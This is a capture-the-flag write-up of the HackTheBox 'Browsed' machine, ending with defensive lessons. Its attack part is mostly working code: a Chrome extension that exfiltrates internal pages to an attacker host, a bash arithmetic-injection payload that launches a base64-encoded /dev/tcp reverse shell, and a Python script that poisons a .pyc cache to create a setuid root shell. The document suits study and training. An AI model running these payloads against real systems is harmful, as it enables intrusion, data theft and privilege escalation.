# Browsed — HTB Writeup

> **Platform:** HackTheBox
> **Author:** k41r0s3
> **Difficulty:** Medium
> **Category:** Web / Linux Privilege Escalation

---

## TL;DR

A Chrome extension submission portal allows arbitrary JavaScript execution inside a server-side headless browser. The browser has unrestricted access to internal services, including a Flask app with a bash arithmetic injection vulnerability. Chaining SSRF through the extension against the internal endpoint gives an initial shell. Root is achieved by poisoning a Python `.pyc` bytecode cache file in a world-writable `__pycache__` directory, hijacking a `sudo`-privileged script's import at runtime.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port and service enumeration |
| `curl` | Manual HTTP probing |
| `zip` | Packaging the malicious Chrome extension |
| `netcat` | Catching the reverse shell |
| `python3` | Building and injecting the malicious `.pyc` |
| `gitea API` | Enumerating internal repositories |

---

## Recon

Start with a full TCP port scan to map the attack surface.

```bash
nmap -sC -sV -T4 -p- 10.129.2.246
```

**Results:**

```
22/tcp  open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp  open  http  nginx 1.24.0
```

Only two ports. No unusual services, no database ports, no admin panels exposed directly. The complexity must be inside the web application.

Add the hostnames to `/etc/hosts` before proceeding:

```bash
echo "10.129.2.246  browsed.htb browsedinternals.htb" | sudo tee -a /etc/hosts
```

> **Recon mindset:** With a minimal port footprint like this, the entire attack surface is the web app. Spend more time on web enumeration rather than chasing dead ends on other ports.

---

## Enumeration

### Web Application — browsed.htb

Navigating to `http://browsed.htb` presents a Chrome extension submission portal. The site invites users to upload a `.zip` extension and promises a developer will "review" it.

**Key endpoints discovered:**

| Endpoint | Description |
|---|---|
| `/` | Landing page with upload form |
| `/upload.php` | Accepts `.zip` Chrome extension archives |
| `/samples.html` | Download links for three demo extensions |

Download and unpack one of the sample extensions (e.g. `fontify.zip`) to understand the expected structure:

```
fontify/
├── manifest.json
└── content.js
```

**The critical observation:** The word "review" means a human or automated process *loads and executes* the extension. If the backend Chrome instance has no sandbox isolation and can reach internal network resources, a malicious extension is effectively an SSRF-with-code-execution primitive.

Upload a minimal beacon extension to confirm execution:

**`manifest.json`:**
```json
{
  "manifest_version": 3,
  "name": "Beacon",
  "version": "1.0",
  "background": { "service_worker": "background.js" },
  "host_permissions": ["<all_urls>"],
  "permissions": ["scripting", "storage"]
}
```

**`background.js`:**
```javascript
fetch("http://YOUR_IP:8080/beacon");
```

```bash
# Start listener
python3 -m http.server 8080

# Package and upload
zip -j beacon.zip manifest.json background.js
```

A hit on your server confirms the backend Chrome executes your JavaScript. Notice the source IP — it is the target machine calling out, confirming no egress filtering on outbound connections.

### Internal Services Discovery

With code execution inside the browser, probe internal hosts. Chrome's startup logs (leaked in HTTP responses) reveal it visits `http://browsedinternals.htb` automatically.

Update `background.js` to fetch that internal host and exfiltrate the response:

```javascript
fetch("http://browsedinternals.htb/")
  .then(r => r.text())
  .then(body => fetch("http://YOUR_IP:8080/?data=" + btoa(body)));
```

**Finding:** `browsedinternals.htb` hosts a **Gitea 1.24.5** instance (proxied internally on port 3000, exposed via nginx).

### Gitea Repository Enumeration

Browse the Gitea instance through the extension or directly (if accessible externally via the nginx proxy). Register a test account to access public repositories.

Larry's public repository `MarkdownPreview` contains the full source code of an internal Flask web application. The README explicitly warns: *"This webapp allows us to convert our md files to html… it should only run locally !!!"*

**`app.py` (key route):**
```python
@app.route('/routines/<routine_id>')
def run_routine(routine_id):
    subprocess.run(["bash", "routines.sh", routine_id])
    return "Routine executed !"
```

**`routines.sh` (vulnerable logic):**
```bash
if [[ "$1" -eq 0 ]]; then
    # cleanup
elif [[ "$1" -eq 1 ]]; then
    # backup
else
    echo "Unknown routine ID"
fi
```

The Flask app runs on `localhost:5000` — unreachable from outside, but reachable from our Chrome extension.

> **Enumeration mindset:** Source code in a version control system is a gold mine. Even "harmless" internal tools can have critical flaws. The README warning that it should only run locally is itself a clue — it means the developer knew external access would be dangerous.

---

## Exploitation

### Understanding the Vulnerability — Bash Arithmetic Injection

The `[[ "$1" -eq 0 ]]` construct uses bash's **arithmetic evaluation** for the `-eq` comparison. Inside this context, bash supports array subscript syntax `varname[index]`, and evaluates `index` as an arithmetic expression — which includes executing `$(command)` substitutions.

**Payload concept:**
```
a[$(id)]
```

Bash processes this as: evaluate the array index → execute `id` → attempt the comparison. The command runs as a side effect before the comparison is even evaluated. No spaces are required, so URL encoding issues are minimal.

**Why not `0$(cmd)` or `${IFS}` tricks?**
When `$1` receives a value like `0${IFS}$(cmd)`, bash sees the full string as the value of `$1`. The `${IFS}` does not expand at the stage where `$1` is substituted — it arrives literally. The arithmetic injection via `a[...]` works precisely because bash enters arithmetic evaluation mode for the `-eq` operand.

### Building the Exploit Chain

The attack chain is:

```
Malicious extension → Chrome executes JS → fetch() to localhost:5000 → bash injection → reverse shell
```

Craft the final `background.js`:

```javascript
const TARGET = "http://127.0.0.1:5000/routines/";
const sp = "%20";

// Encode the reverse shell to avoid special characters in the URL
// Original: bash -c 'bash -i >& /dev/tcp/YOUR_IP/9001 0>&1'
const b64 = "BASE64_OF_YOUR_REVERSE_SHELL_HERE";

// Array subscript injection: forces bash to execute $(cmd) inside [[ $1 -eq 0 ]]
const exploit = "a[$(echo" + sp + b64 + "|base64" + sp + "-d|bash)]";

fetch(TARGET + exploit, { mode: "no-cors" });
```

Generate your base64 payload:
```bash
echo -n "bash -c 'bash -i >& /dev/tcp/YOUR_IP/9001 0>&1'" | base64 -w0
```

Package and upload:
```bash
zip -j evil_ext.zip manifest.json background.js
```

Start your listener, then upload the zip:
```bash
nc -lvnp 9001
```

Shell arrives as `larry` within roughly 10 seconds as the headless Chrome processes the extension.

### Why This Works

The extension's `fetch()` call goes to `localhost:5000` — a service that is completely isolated from the external network but fully accessible from within the server's loopback interface. The browser bridges the external attacker and the internal-only Flask service. The Flask app passes our payload directly to bash without sanitisation, and bash's arithmetic context executes it.

---

## Post-Exploitation

### Stabilise the Shell

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Privilege Escalation Enumeration

```bash
sudo -l
```

```
User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

Inspect the script and its directory:

```bash
cat /opt/extensiontool/extension_tool.py
ls -la /opt/extensiontool/
ls -la /opt/extensiontool/__pycache__/
```

**Permission findings:**

| Path | Permissions | Notes |
|---|---|---|
| `extension_tool.py` | `-rwxrwxr-x` | Cannot write as larry |
| `extension_utils.py` | `-rw-rw-r--` | Cannot write as larry |
| `__pycache__/` | `drwxrwxrwx` | **World-writable** ← vulnerability |

The script imports a local module:
```python
from extension_utils import validate_manifest
```

### Understanding .pyc Cache Poisoning

Python caches compiled bytecode in `__pycache__/` as `.pyc` files. When importing a module, Python checks whether a cached `.pyc` exists. If it does, Python validates it using **only two fields**: the source file's size (in bytes) and its modification timestamp (`mtime`). If both match, Python executes the cached bytecode directly — no hash, no content check.

Since `__pycache__` is world-writable, we can replace the legitimate `.pyc` with a malicious one. We just need to make it pass Python's metadata check by:

1. Padding our malicious source to **exactly the same byte count** as the original
2. Matching the **exact mtime** of the original source file using `os.utime()`
3. Compiling with `PycInvalidationMode.TIMESTAMP` so Python uses timestamp-based validation

### The Exploit Script

Get original file stats first:
```bash
python3 -c "
import os
s = os.stat('/opt/extensiontool/extension_utils.py')
print('size:', s.st_size)
print('mtime:', s.st_mtime)
"
```

Save the following as `/tmp/xpl.py` on the target:

```python
import os
import py_compile
import shutil

orig    = '/opt/extensiontool/extension_utils.py'
pyc_dst = '/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc'
tmp_src = '/tmp/evil_utils.py'

# Read original metadata
st = os.stat(orig)
orig_size  = st.st_size
orig_mtime = st.st_mtime
print(f"[*] Original size: {orig_size}, mtime: {orig_mtime}")

# Malicious payload — also defines the functions extension_tool.py expects,
# so the script does not crash before our payload executes.
payload = '''import os
os.system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash")
import json
import subprocess
import shutil
from jsonschema import validate, ValidationError

MANIFEST_SCHEMA = {"type":"object","properties":{"manifest_version":{"type":"number"},"name":{"type":"string"},"version":{"type":"string"},"permissions":{"type":"array","items":{"type":"string"}}},"required":["manifest_version","name","version"]}

def validate_manifest(path):
    with open(path,"r",encoding="utf-8") as f: data = json.load(f)
    try:
        validate(instance=data,schema=MANIFEST_SCHEMA)
        print("[+] Manifest is valid.")
        return data
    except ValidationError as e:
        print("[x] Manifest validation error:"); print(e.message); exit(1)

def clean_temp_files(extension_dir):
    temp_dir="/opt/extensiontool/temp"
    if os.path.exists(temp_dir): shutil.rmtree(temp_dir); print(f"[+] Cleaned up {temp_dir}")
    else: print("[+] No temporary files to clean.")
    exit(0)
'''

# Pad to exactly match the original file size
current_size = len(payload.encode())
if current_size < orig_size:
    payload += '#' * (orig_size - current_size)
elif current_size > orig_size:
    print(f"[-] Payload too large by {current_size - orig_size} bytes — trim it!")
    exit(1)

print(f"[*] Padded payload size: {len(payload.encode())}")

with open(tmp_src, 'w') as f:
    f.write(payload)

# Match the original mtime exactly
os.utime(tmp_src, (orig_mtime, orig_mtime))

# Compile with TIMESTAMP invalidation mode
tmp_pyc = '/tmp/evil_utils.cpython-312.pyc'
py_compile.compile(tmp_src, cfile=tmp_pyc,
                   invalidation_mode=py_compile.PycInvalidationMode.TIMESTAMP)

# Drop into __pycache__
shutil.copy(tmp_pyc, pyc_dst)
print(f"[+] Poisoned .pyc injected into {pyc_dst}")
```

### Trigger and Escalate

```bash
python3 /tmp/xpl.py
sudo /opt/extensiontool/extension_tool.py --ext Fontify
ls -la /tmp/rootbash   # should be -rwsr-xr-x owned by root
/tmp/rootbash -p
whoami                  # root
```

---

## Lessons Learned

### 1 — Server-side browser execution is an SSRF amplifier
When a web app processes user-supplied content in a headless browser, the browser inherits the server's network context. Any internal service reachable on loopback or a private subnet becomes part of your attack surface. Always ask: *what can this browser reach that I cannot?*

### 2 — Bash `-eq` arithmetic injection is subtle
The `[[ "$var" -eq N ]]` pattern looks safe because `-eq` implies numeric comparison. But bash evaluates the operand in an arithmetic context, which means array subscript syntax `a[$(cmd)]` silently executes arbitrary commands. Safe input handling for shell scripts requires explicit whitelisting (e.g. `[[ "$1" =~ ^[0-9]+$ ]]` before using `-eq`).

### 3 — Python .pyc validation is metadata-only
Python's timestamp-based cache invalidation only checks file size and mtime — not a hash of the source. A world-writable `__pycache__` is equivalent to a world-writable import, regardless of the source file's permissions. Fix: remove world-write from `__pycache__`, or use `PYTHONDONTWRITEBYTECODE=1` for privileged scripts.

### 4 — Source code in internal git repos is critical recon
The Gitea repository exposed the Flask app's source, revealing both the vulnerability class and the exact endpoint. Even "internal-only" code should be audited as if it were public — because an attacker with SSRF can read it.

### 5 — Chain your primitives
No single vulnerability here was individually catastrophic. The chain was: extension execution → SSRF → bash injection → shell → misconfigured `__pycache__` → root. Recognising how primitives connect is what separates enumeration from exploitation.

---

*k41r0s3*
